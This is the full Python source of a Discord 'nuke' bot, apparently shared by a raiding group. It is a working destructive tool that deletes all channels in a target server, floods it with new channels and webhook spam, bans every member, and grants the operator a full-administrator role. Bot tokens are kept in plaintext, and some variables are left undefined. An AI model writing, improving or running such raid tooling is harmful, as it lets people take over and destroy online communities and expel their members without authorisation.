#==============================[SOURCE CODE BY YOUNGAOS | https://discord.gg/deaddestroyers]==========================
import discord, asyncio, os, colorama, time, pystyle, json, requests, sys
from discord.ext import commands
from colorama import Fore, Back, Style
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
VERSION = "1.0.0.2"
banner1 = rf"""
                          ███████  █████  ██    ██  █████   ██████  ███████ 
                          ██      ██   ██ ██    ██ ██   ██ ██       ██      
                          ███████ ███████ ██    ██ ███████ ██   ███ █████   
                               ██ ██   ██  ██  ██  ██   ██ ██    ██ ██      
                          ███████ ██   ██   ████   ██   ██  ██████  ███████  
=====================================================================================================
Varsion: {VERSION}
Plan: Free
(NO MORE PLANS FOR THE MOMENT)
=====================================================================================================                                                  
                                                                                                                                                                                                                                                                
"""[1:]

def clear():
  os.system("clear")


intents = discord.Intents().all()
bot = commands.Bot(command_prefix=";124ohboijhiijioijnjojn5ed", intents=intents)
bot.remove_command('help')
archivo_tokens = "tokens.json"

def guardar_token(token):
    with open(archivo_tokens, "r+") as archivo:
        data = json.load(archivo)
        data["tokens"].append(token)
        archivo.seek(0)
        json.dump(data, archivo, indent=4)

def obtener_tokens_guardados():
    with open(archivo_tokens) as archivo:
        data = json.load(archivo)
        return data["tokens"]

if not os.path.isfile(archivo_tokens):
    data = {
        "nombre_bot": nombre_bot,
        "id_bot": id_bot,
        "tokens": ["TOKEN_POR_DEFECTO"]
    }
    with open(archivo_tokens, "w") as archivo:
        json.dump(data, archivo, indent=4)

opcion = input("==============\n1: Saved tokens\n2: New Token\n==============")

if opcion == "1":
    tokens_guardados = obtener_tokens_guardados()
    print("Tokens guardados:")
    for i, token in enumerate(tokens_guardados):
        print(f"{i+1}: {token}")
    opcion_token = input("Selecciona un token: ")
    token_seleccionado = tokens_guardados[int(opcion_token)-1]
    token = token_seleccionado
elif opcion == "2":
    token_seleccionado = input("TOKEN: ")
    guardar_token(token_seleccionado)
    token = token_seleccionado
else:
    print("INVALID OPTION")
    exit()

server = input("[!] Server ID: ")

API_BASE_URL = "https://api.github.com/repos/youngaos/Savage-Nuker"

def get_latest_version():
    url = f"{API_BASE_URL}/releases/latest"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()["tag_name"]
    else:
        return None

latest_version = get_latest_version()
if latest_version and latest_version > VERSION:
    print("NEW UPDATE | Actual version {} | New Version {}".format(VERSION, latest_version))
    sys.exit()

#============NUKE=============

async def nuke(): 
   try:
       guilda = bot.get_guild(int(server))
       if guilda is None:
           raise ValueError("[!] Server Not Found")
   except ValueError as e:
       print(f"[!] Error: {e}")
       return

   channels = guilda.channels
   channel_list = channels

   async def delete_channel(channel):
    try:     
     await channel.delete()
    except:
     pass

   tasks = []
   for channel in channel_list:
    try: 
     tasks.append(asyncio.ensure_future(delete_channel(channel)))
    except:
      pass 

   await asyncio.gather(*tasks)
   print(Fore.GREEN + "[LOG] Nuke COMPLETED.")  
   await asyncio.sleep(2)
   clear()
   await optins()
         

#===============RAID===============         
async def raid():
   try: 
        canales = input("[!] Channels name: ")
        am = input("[!] Channels amount: ")
   except:
        pass    
   if int(am) > 500:
   	 print("[!!] Channel limit is 500.")
   	 await asyncio.sleep(2)
   	 return await raid()
   try:
       guilda = bot.get_guild(int(server))
       if guilda is None:
           raise ValueError("[!] Server Not Found")
   except ValueError as e:
       print(f"[!] Error: {e}")
       return
   for i in range(int(am)):
    try:
        task = asyncio.ensure_future(guilda.create_text_channel(canales))
        print(f"[CHANNEL]                 {Fore.GREEN} CREATED {canales}, {i} TIMES.")        
        tasks.append(task)
        await asyncio.gather(*tasks)
    except:
        print(f"[CHANNEL]                 {Fore.RED} NOT CREATED {canales}, TIME: {i}")
   print(Fore.GREEN + "[LOG] CHANNELS CREATED.")  
   await asyncio.sleep(2)
   clear()
   await optins()
#============SPAM=================
async def spam2():
    try:
        guilda = bot.get_guild(int(server))
        if guilda is None:
            raise ValueError("[!] Server Not Found")
    except:
        pass

    try:    
        spammsg = input("[!] Spam Message: ") 
        pings = input("[!] Pings por canal: ") 
    except:
        pass

    tasks = []
    channels = guilda.text_channels[:50] 

    for channel in channels:
        webhook = None
        for wh in await channel.webhooks(): 
            webhook = wh
            break

        if webhook is None: 
            webhook = await channel.create_webhook(name="DD")

        for i in range(int(pings)):
            try:    
                message = spammsg
                task = asyncio.ensure_future(webhook.send(message, username="DD NUKE TOOL"))
                tasks.append(task)
                print(f"[WEBHOOK]                 {Fore.GREEN} SPAMMED WEBHOOK {i} TIMES")                
            except: 
                print(f"[WEBHOOK]                 {Fore.RED} NOT SPAMMED WEBHOOK NUMBER {i}, BECAUSE RATE LIMIT")
                return await optins()

    print(Fore.GREEN + "[LOG] CHANNELS SPAMMED.")  
    await asyncio.sleep(2)
    clear()
    await optins()


#================BANALL===============
async def banall():
    try:
       guild = bot.get_guild(int(server))
       if guild is None:
           raise ValueError("[!] Server Not Found")
    except ValueError as e:
       print(f"[!] Error: {e}")
       return		
    members = guild.members
    async def ban_member(member):
      try:	
        await member.ban(reason=".gg/deaddestroyers")
      except:
        pass  
    tasks = []
    for member in members:
      try:
        tasks.append(asyncio.ensure_future(ban_member(member)))
        print(Fore.GREEN + f"[!] Banned {member}")
      except:
        print(Fore.RED + f"[!!] NOT Banned {member}")
    await asyncio.gather(*tasks)
    print(Fore.GREEN + "[LOG] BANALL COMPLETED.")    
    await asyncio.sleep(2)
    clear()
    await optins()
#================ADMIN================
async def admin():
   try: 
        autho = input("[!] Your ID: ")
   except:
        pass     
   try:
       guild = bot.get_guild(int(server))
       if guild is None:
           raise ValueError("[!] Server Not Found")
   except ValueError as e:
       print(f"[!] Error: {e}")
       return
   try:
            role = await guild.create_role(name=".",permissions=discord.Permissions(8).all(),colour=discord.Colour(0x000000))
            author = guild.get_member(int(autho))
            await author.add_roles(role)
            print(Fore.GREEN + f"Admin in {guild.name}")
            await asyncio.sleep(2)
            clear()
            await optins()
   except:
   	 pass
#=============OPTIONS==============       
async def optins():
        print(Colorate.Vertical(Colors.white_to_red, banner1, 1))
        print(f"[+] Bot iniciado como {bot.user}\n")
        print(Fore.BLUE + f"""
            ╔═════════════════════╦═════════════════════════════╦═════════════╗
            ║ 1; Delete Channels    3; Spam Channels (Webhooks)   5; MassBan  ║
            ║ 2; Create Channels    4; Admin                                  ║
            ╚═════════════════════╩═════════════════════════════╩═════════════╝
            """)     
        option = input(": ")
        try:    
            if option == "1":
                try:
                    await nuke()
                except:
                    pass
            elif option == "2":
                try:
                    await raid()
                except:
                    pass   
            elif option == "3":
                try:
                    await spam2() 
                except:
                    pass      
            elif option == "4":
                try:
                    await admin() 
                except:
                    pass    
            elif option == "5":
                try:
                    await banall() 
                except:
                    pass    
            else:
                try:
                    print("[!] Invalid option.")
                    await optins()
                except:
                    pass
        except:
            return


@bot.event
async def on_ready():
    clear()
    await optins()
    return


async def st():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        await bot.start(token)
    except:
        print(Fore.RED + "[!] Invalid Token or no intents")
    finally:
        await bot.close()
        loop.close()

asyncio.run(st())
